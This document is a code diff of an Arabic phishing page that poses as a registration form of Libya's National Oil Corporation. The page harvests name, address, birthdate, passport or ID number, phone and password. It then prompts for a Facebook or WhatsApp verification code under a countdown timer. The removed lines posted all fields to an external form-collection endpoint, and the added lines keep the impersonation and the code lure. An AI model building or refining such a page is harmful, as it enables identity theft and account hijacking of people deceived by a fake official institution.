@@ -2,27 +2,27 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تسجيل البيانات - المؤسسة الوطنية للنفط</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>تسجيل البيانات</title>
   <style>
     body {
       font-family: 'Tahoma', sans-serif;
-      background-color: #ffffff;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      margin: 0;
     }
 
     .form-container {
-      background-color: #f7f9fc;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.08);
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 16px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
       width: 90%;
-      max-width: 480px;
-      border-top: 10px solid #002147;
+      max-width: 320px;
     }
 
     .logo {
@@ -31,24 +31,28 @@
     }
 
     .logo img {
-      max-width: 90px;
+      max-width: 80px;
     }
 
     h2 {
       text-align: center;
       color: #002147;
+      font-size: 20px;
       margin-bottom: 20px;
     }
 
     .form-group {
-      margin-bottom: 15px;
+      margin-bottom: 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     label {
       display: block;
-      margin-bottom: 6px;
+      margin-bottom: 4px;
+      font-size: 13px;
       color: #002147;
-      font-weight: bold;
     }
 
     input[type="text"],
@@ -56,282 +60,175 @@
     input[type="password"],
     select {
       width: 100%;
+      max-width: 260px;
       padding: 10px;
-      font-size: 15px;
+      font-size: 14px;
       border: 1px solid #ccc;
       border-radius: 6px;
       background-color: #fff;
     }
 
-    input:disabled {
-      background-color: #eee;
-    }
-
-    .birthdate-selects {
+    .birthdate-inputs {
       display: flex;
-      gap: 5px;
+      gap: 6px;
+      justify-content: center;
+      width: 100%;
+      max-width: 260px;
     }
 
-    .birthdate-selects select {
+    .birthdate-inputs input {
       flex: 1;
+      text-align: center;
+      padding: 10px;
+      font-size: 14px;
+    }
+
+    .password-wrapper {
+      width: 100%;
+      max-width: 260px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0 auto 20px;
     }
 
     button {
       width: 100%;
       padding: 12px;
-      background-color: #d71920;
-      border: none;
+      background-color: #2e7d32; /* أخضر */
       color: #fff;
-      font-size: 16px;
-      font-weight: bold;
+      border: none;
       border-radius: 6px;
+      font-size: 15px;
+      font-weight: bold;
       cursor: pointer;
-      margin-top: 10px;
-    }
-
-    button:hover {
-      background-color: #b1151a;
-    }
-
-    .password-wrapper {
-      position: relative;
-    }
-
-    .password-wrapper input {
-      text-align: center;
-      padding-left: 40px;
-    }
-
-    .toggle-password {
-      position: absolute;
-      top: 50%;
-      left: 10px;
-      transform: translateY(-50%);
-      cursor: pointer;
-      color: #555;
-      font-size: 18px;
-      user-select: none;
+      margin-top: 20px;
     }
 
     .code-popup {
       position: fixed;
-      bottom: 20px;
-      left: 20px;
-      background: #ffffff;
+      bottom: 15px;
+      left: 10px;
+      right: 10px;
+      background: #fff;
       border: 1px solid #ccc;
-      border-radius: 12px;
-      padding: 15px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.15);
+      border-radius: 10px;
+      padding: 14px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       display: none;
-      width: 300px;
-      z-index: 1000;
-      animation: fadeIn 0.4s ease-in-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
     }
 
     .code-popup h4 {
-      margin-top: 0;
-      margin-bottom: 10px;
+      margin: 0 0 8px;
       color: #002147;
+      font-size: 15px;
     }
 
     .code-popup input {
       width: 100%;
       padding: 10px;
       font-size: 14px;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
       border: 1px solid #ccc;
       border-radius: 6px;
     }
 
-    .code-popup .error {
-      color: red;
+    .countdown {
       font-size: 13px;
+      color: #555;
+      margin-bottom: 8px;
+    }
+
+    .error {
+      color: red;
+      font-size: 12px;
       display: none;
     }
 
-    .countdown {
-      font-size: 14px;
-      color: #444;
-      margin-bottom: 10px;
-    }
-
-    @media (max-width: 500px) {
-      .birthdate-selects {
-        flex-direction: column;
-      }
-
+    @media (max-width: 400px) {
       .form-container {
-        padding: 20px;
+        padding: 15px;
+        margin: 10px;
       }
     }
   </style>
 </head>
 <body>
-
-<div class="form-container">
-  <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3d/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط" />
-  </div>
-  <h2>تسجيل البيانات</h2>
-  <form id="userForm">
-    <div class="form-group">
-      <label for="name">الاسم الكامل</label>
-      <input type="text" id="name" name="name" required />
+  <div class="form-container">
+    <div class="logo">
+      <img src="logo.png" alt="شعار المؤسسة الوطنية للنفط">
     </div>
-
-    <div class="form-group">
-      <label for="address">العنوان</label>
-      <input type="text" id="address" name="address" required />
-    </div>
-
-    <div class="form-group">
-      <label>تاريخ الميلاد</label>
-      <div class="birthdate-selects">
-        <select id="birthDay" required>
-          <option value="">اليوم</option>
-          ${[...Array(31)].map((_, i) => `<option value="${i+1}">${i+1}</option>`).join('')}
-        </select>
-        <select id="birthMonth" required>
-          <option value="">الشهر</option>
-          ${[...Array(12)].map((_, i) => `<option value="${i+1}">${i+1}</option>`).join('')}
-        </select>
-        <select id="birthYear" required>
-          <option value="">السنة</option>
-          ${Array.from({length: 2008 - 1976 + 1}, (_, i) => {
-            const year = 1976 + i;
-            return `<option value="${year}">${year}</option>`;
-          }).join('')}
-        </select>
+    <h2>نموذج التسجيل</h2>
+    <form id="registrationForm">
+      <div class="form-group">
+        <label for="fullName">الاسم الكامل</label>
+        <input type="text" id="fullName" name="fullName" required>
       </div>
-    </div>
+      <div class="form-group">
+        <label for="address">العنوان</label>
+        <input type="text" id="address" name="address" required>
+      </div>
+      <div class="form-group">
+        <label>تاريخ الميلاد</label>
+        <div class="birthdate-inputs">
+          <input type="text" name="day" placeholder="يوم" maxlength="2" required>
+          <input type="text" name="month" placeholder="شهر" maxlength="2" required>
+          <input type="text" name="year" placeholder="سنة" maxlength="4" required>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="idNumber">رقم الجواز أو البطاقة</label>
+        <input type="text" id="idNumber" name="idNumber" required>
+      </div>
+      <div class="form-group">
+        <label for="phone">رقم الهاتف</label>
+        <input type="tel" id="phone" name="phone" required>
+      </div>
+      <div class="form-group password-wrapper">
+        <label for="password">الرقم السري</label>
+        <input type="password" id="password" name="password" minlength="6" required>
+      </div>
+      <div style="height: 14px;"></div>
+      <button type="submit">إرسال البيانات</button>
+    </form>
+  </div>
 
-    <div class="form-group">
-      <label for="documentType">نوع الوثيقة</label>
-      <select id="documentType" name="documentType" required>
-        <option value="">-- اختر نوع الوثيقة --</option>
-        <option value="جواز سفر">جواز سفر</option>
-        <option value="بطاقة شخصية">بطاقة شخصية</option>
-      </select>
-    </div>
+  <div class="code-popup" id="codePopup">
+    <h4>أدخل كود التأكيد من فيسبوك أو واتساب</h4>
+    <input type="text" id="verificationCode" maxlength="8" placeholder="كود من 6-8 حروف أو أرقام">
+    <div class="countdown" id="countdown">08:00</div>
+    <div class="error" id="codeError">يرجى إدخال كود صحيح من 6 إلى 8 خانات.</div>
+    <button onclick="verifyCode()">تأكيد</button>
+  </div>
 
-    <div class="form-group">
-      <label for="documentNumber">رقم الوثيقة</label>
-      <input type="text" id="documentNumber" name="documentNumber" required />
-    </div>
+  <script>
+    document.getElementById("registrationForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      document.querySelectorAll("#registrationForm input").forEach(input => input.disabled = true);
+      document.getElementById("codePopup").style.display = "block";
+      startCountdown();
+    });
 
-    <div class="form-group">
-      <label for="phone">رقم الهاتف</label>
-      <input type="tel" id="phone" name="phone" placeholder="2189XXXXXXXX" required />
-    </div>
-
-    <div class="form-group password-wrapper">
-      <label for="password">الرقم السري</label>
-      <input type="password" id="password" name="password" placeholder="6 أحرف أو أكثر" required />
-      <span class="toggle-password" onclick="togglePassword()">👁️</span>
-    </div>
-
-    <button type="submit">إرسال البيانات</button>
-  </form>
-</div>
-
-<div class="code-popup" id="codePopup">
-  <h4>أدخل كود التأكيد</h4>
-  <div class="countdown" id="countdown">08:00</div>
-  <input type="text" id="confirmCode" maxlength="8" placeholder="6 إلى 8 رموز" />
-  <div class="error" id="codeError">يرجى إدخال كود من 6 إلى 8 رموز فقط.</div>
-  <button onclick="validateCode()">تأكيد</button>
-</div>
-
-<script>
-  const form = document.getElementById('userForm');
-  const codePopup = document.getElementById('codePopup');
-  const confirmCodeInput = document.getElementById('confirmCode');
-  const codeError = document.getElementById('codeError');
-  const countdownEl = document.getElementById('countdown');
-
-  form.addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const password = document.getElementById('password').value.trim();
-    if (password.length < 6) {
-      alert("الرقم السري يجب أن يكون 6 خانات أو أكثر.");
-      return;
+    function startCountdown() {
+      let time = 480;
+      const countdownEl = document.getElementById("countdown");
+      const interval = setInterval(() => {
+        const minutes = Math.floor(time / 60);
+        const seconds = time % 60;
+        countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        if (time-- <= 0) clearInterval(interval);
+      }, 1000);
     }
 
-    const birthDay = document.getElementById('birthDay').value;
-    const birthMonth = document.getElementById('birthMonth').value;
-    const birthYear = document.getElementById('birthYear').value;
-    if (!(birthDay && birthMonth && birthYear)) {
-      alert("يرجى تحديد تاريخ الميلاد بالكامل.");
-      return;
-    }
-
-    const formData = new FormData(form);
-    formData.append("birthdate", `${birthYear}-${birthMonth.padStart(2,'0')}-${birthDay.padStart(2,'0')}`);
-
-    try {
-      const response = await fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
-        method: 'POST',
-        body: formData
-      });
-
-      if (response.ok) {
-        Array.from(form.elements).forEach(el => el.disabled = true);
-        codePopup.style.display = 'block';
-        startCountdown(8 * 60);
+    function verifyCode() {
+      const code = document.getElementById("verificationCode").value.trim();
+      const errorEl = document.getElementById("codeError");
+      if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
+        alert("تم التأكيد بنجاح!");
       } else {
-        alert("فشل في إرسال البيانات، حاول لاحقًا.");
+        errorEl.style.display = "block";
       }
-    } catch (error) {
-      alert("حدث خطأ في الاتصال.");
-      console.error(error);
     }
-  });
-
-  function validateCode() {
-    const code = confirmCodeInput.value.trim();
-    if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
-      codeError.style.display = 'none';
-      confirmCodeInput.disabled = true;
-      window.location.href = "success.html";
-    } else {
-      codeError.style.display = 'block';
-    }
-  }
-
-  function startCountdown(seconds) {
-    let remaining = seconds;
-    const interval = setInterval(() => {
-      const mins = Math.floor(remaining / 60);
-      const secs = remaining % 60;
-      countdownEl.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-      if (remaining <= 0) {
-        clearInterval(interval);
-        confirmCodeInput.disabled = true;
-        codeError.textContent = "انتهى وقت الكود.";
-        codeError.style.display = 'block';
-      }
-      remaining--;
-    }, 1000);
-  }
-
-  function togglePassword() {
-    const passwordInput = document.getElementById("password");
-    const toggleIcon = document.querySelector(".toggle-password");
-    if (passwordInput.type === "password") {
-      passwordInput.type = "text";
-      toggleIcon.textContent = "🙈";
-    } else {
-      passwordInput.type = "password";
-      toggleIcon.textContent = "👁️";
-    }
-  }
-</script>
-
+  </script>
 </body>
 </html>
